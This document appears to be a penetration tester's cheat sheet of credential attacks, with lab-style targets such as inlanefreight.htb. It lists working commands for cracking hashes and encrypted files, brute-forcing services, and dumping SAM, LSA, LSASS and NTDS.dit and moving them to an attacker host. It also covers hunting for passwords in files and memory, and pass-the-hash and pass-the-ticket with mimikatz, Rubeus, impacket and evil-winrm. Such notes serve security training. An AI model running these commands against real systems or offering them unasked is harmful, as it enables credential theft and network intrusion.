// Password Attacks
//! John the Ripper
//* Getting hash type
// hashid -j <hash>
//* Single crack mode
// john --single <hashfile>
//* Wordlist mode
// john --format=<hashtype> --wordlist=<wordlistfile> <hashfile>
//* Incremental mode
// john --incremental <hashfile>
//! Hashcat
//* Guessing hash type
// hasdid -m <hash>
//* wordlist mode
// hashcat -m <hashtype> -a 0 <hashfile> <wordlistfile>
// hashcat -m 0 -a 0 flag.txt final_wordlist.txt
//* Adding a basd64 rule
// hashcat -m <hashtype> -a 0 <hashfile> <wordlistfile> -r /usr/share/hashcat/rules/best64.rule
//* Brute force mode
// hashcat -m <hashtype> -a 3 <hashfile> ?a?a?a?a?a?a
//! Cewl
//* Generating custom wordlists
// the url need to contain info about the target
// cewl {url} -d {pages-depth} -m {min-length} --with-numbers  -w  wordlist.txt
//* Combining the result words to get longer passwords
// hashcat --stdout  -a 1 wordlist.txt wordlist.txt  > long-wordlist.txt
//* Then you need to filter based on passowrd rules
// ex : awk 'length($0) >= 12' long-wordlist.txt > valid-long-wordlist.txt
//* Then you can apply custom rule by hashcat to get more variations
// hashcat --force valid-long-wordlist.txt -r custom.rule --stdout | sort -u > final_wordlist.txt
//! Protected files
//* Fining encrypted files
// ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
//* Finding ssh keys
//  grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
//* Cracking encrypted ssh keys
// at ctf/john/john/run
// python3 ssh2john.py {encrypted-ssh} > {hash_file}
// ./john --wordlist={wordlist} {hash_file}
//* Cracking office files
// python3 office2john.py {encrypted-[docs|xlsx]} > {hash_file}
// ./john --wordlist={wordlist} {hash_file}
//* Cracking pdf files
// python3 pdf2john.py {encrypted-pdf} > {hash_file}
// ./john --wordlist={wordlist} {hash_file}
//* Cracking zip files
// ./zip2john {encrypted-zip} > {hash_file}
// ./john --wordlist={wordlist} {hash_file}
//* Cracking OpenSSL encrypted GZIP files
// for i in $(cat {wordlist});do openssl enc -aes-256-cbc -d -in {encrypted-zip} -k $i 2>/dev/null| tar xz;done
//* Cracking BitLocker-encrypted drives
// ./bitlocker2john -i {encrypted-vhd} > backup.hashes
// grep "bitlocker\$0" backup.hashes > backup.hash
// hashcat -a 0 -m 22100 backup.hash {wordlist}
//! Attacking Services
//* Netexec
// netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist> --port {port}
//* Evil-WinRM
// evil-winrm -i {ip} -u {user} -p {password}
//* Hydra
// hydra -L user.list -P password.list {proto}://{ip}
//* Searching for deafult creds
// creds search <service>
//! Windows
//* SAM ,System,Security
// if we have administrative access we need to create copies of these files
// C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
// C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
// C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
// then move them of our host machine (ex: using smb server)
// then we use impacket-secretsdump to dump the hashes
// at virtenv
// sudo python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
// then simply usein hash cat to crack them
// sudo hashcat -m 1000 hashes.txt rockyou.txt
//* DCC2 hashes
// hashcat -m 2100 '$DCC2$10240#Administrator#10c34f0413c282fbc37de4ee4bb75360' rockyou.txt
//* Dumping LSA secrets remotely
// netexec smb {ip} --local-auth -u {username} -p {password} --lsa
//* Dumping LSASS process memory
// get pid => Get-Process lsass
// as administrator run => rundll32 C:\windows\system32\comsvcs.dll, MiniDump {pid} C:\lsass.dmp full
// move the dump file to our host machine
// run Pypykatz to extract credentials => pypykatz lsa minidump lsass.dmp
// crack the hashes with hashcat
//* Attacking Windows Credential Manager
// if we already go a shell into the user we can use : cmdkey /list
// we can login using the found creds by : runas /savecred /user:{user} cmd
// then if we got admin preveliges we can run mimikatz to dump creds :  vault::cred
//* Dictionary attacks against AD accounts using NetExec
// validating usernames :  ./kerbrute userenum --dc {ip} --domain {domain} {names-list}
// brute forcing passwords :  netexec smb {ip} -u {username} -p {password-list}
//* Capturing NTDS.dit
// checking preveliges : net localgroup | net user {username}
// creating a shadow copy :  vssadmin CREATE SHADOW /For=C:
// copy the ntds.dit :  mkdir c:\NTDS | cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
// transfer to host : cmd.exe /c move C:\NTDS\NTDS.dit \\{ip}\CompData
// we also to make a copy of SYSTEM file and transfer it to our host machine
// then dump hashes with : impacket-secretsdump -ntds NTDS.dit -system {system-save} LOCAL
// we can aslo dump hashses directly using : netexec smb {ip} -u {username} -p {password} -M ntdsutil
//* Credential Hunting
// using LaZagne.exe
// searching for files containing passwords : findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
//! Linux
//* Cracking Linux Credentials
// copy needed files
// sudo cp /etc/passwd passwd.bak
// sudo cp /etc/shadow shadow.bak
// created the hash file : unshadow passwd.bak shadow.bak > {hashes}
// crack the hashes : hashcat -m 1800 -a 0 {hashes} rockyou.txt
//* Searching configuration files
// for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
//* Searching creds
// for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
//* Searching databases
// for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
//* Searching for notes
// find /home/* -type f -name "*.txt" -o ! -name "*.*"
//* Searching for scripts
// for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
//* Searching for cron jobs
// cat /etc/crontab
//* Searching for history files
// tail -n5 /home/*/.bash*
//* Enumerating log files
// for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
//* Using mimipenguin
// to dump creds from memory
// sudo python3 mimipenguin.py
//* Using LaZagne
// sudo python2.7 LaZagne.py all
//* Getting creds from firefox
// python3.9 firefox_decrypt.py
//! Credential Hunting in Network Shares
//* Snaffer
// Snaffler.exe -s
//* Netexec
// nxc smb 10.129.237.136 -u {username} -p '{password}' -M spider_plus -o DOWNLOAD_FLAG=True | read the output on the folder displayed
// nxc smb 10.129.237.136 -u mendres -p 'Inlanefreight2025!' --users
//! Pass The Hash
//* mimikatz (locally)
// mimikatz.exe privilege::debug "sekurlsa::pth /user:{username} /rc4:{hash} /domain:{domain} /run:cmd.exe" exit
// mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64f12cddaa88057e06a81b54e73b949b /domain:inlanefreight.htb /run:cmd.exe" exit
//* Invoke-TheHash (remotely/windows)
// at \Invoke-TheHash
// Import-Module .\Invoke-TheHash.psd1
// Invoke-WMIExec -Target {ip} -Domain {domain} -Username {username} -Hash {hash} -Command "cmd cmd" -Verbose
//* Impacket (remotely/linux)
// at virtenv
// impacket-psexec {username}@{ip} -hashes :{hash}
//* Netexec (remotely/linux)
// netexec smb {ip}/24 -u {username} -d . -H {hash} | --local-auth
//* RDP
// xfreerdp  /v:{ip} /u:{username} /pth:{hash}
// xfreerdp  /v:10.129.204.23 /u:julio /pth:64f12cddaa88057e06a81b54e73b949b
//* Evil-WinRM
// at /ctf/evil-Winrm
// ruby evil-winrm.rb -i {ip} -u {username} -H {hash}
//! Pass the Ticket (windows)
//* Harvesting Kerberos tickets from Windows
// as adminmistrator
// mimikatz.exe => sekurlsa::tickets /export
// Rubeus.exe dump /nowrap
//* OverPass the Hash (generating our own TGT)
// dump keys : mimikatz.exe => sekurlsa::ekeys
// generate TGT : sekurlsa::pth /domain:{domain} /user:{username} /ntlm:{hash}
// This will create a new cmd.exe window that we can use to request access to any service we want in the context of the target user.
// using Rubeus : Rubeus.exe asktgt /domain:{domain} /user:{username} /aes256:{aes-hash} /nowrap
//* Creating a tickt and submitting it directly to the current session
// Rubeus.exe asktgt /domain:{domain} /user:{username} /rc4:{hash} /ptt
//* Loading a ticket to the session
// Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
// Rubeus.exe ptt /ticket:{base64-ticket}
//* PowerShell Remoting with Pass the Ticket
// first we import the ticket using either mimikatz or Rubeus
// then we run : Enter-PSSession -ComputerName {ip|name}
//! Pass the Ticket (linux)
//* Check if Linux machine is domain-joined
// realm list
// ps -ef | grep -i "winbind\|sssd"
//* Listing Kerberos tickets
// find / -name *keytab* -ls 2>/dev/null
//* Default keytab file location
// /etc/krb5.keytab
//* Listing KeyTab file information
// klist
// klist -k -t /opt/specialfiles/carlos.keytab
//* Impersonating a user with a KeyTab
// kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
//* Environment variable for Kerberos ticket cache
// KRB5CCNAME ( in /tmp )
//* Extracting KeyTab hashes with KeyTabExtract
// python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
//* Importing the ccache file into our current session
// get the ccache file of the user we want : cp /tmp/krb5cc_647401106_I8I133 .
// then change the env var to point to it : export KRB5CCNAME=/root/krb5cc_647401106_I8I133
// and now we are that user when dealing with kerberos auth : smbclient //dc01/C$ -k -c ls -no-pass
//* Linikatz
// run linikatz.sh with sudo previleges to scan for all available tickets

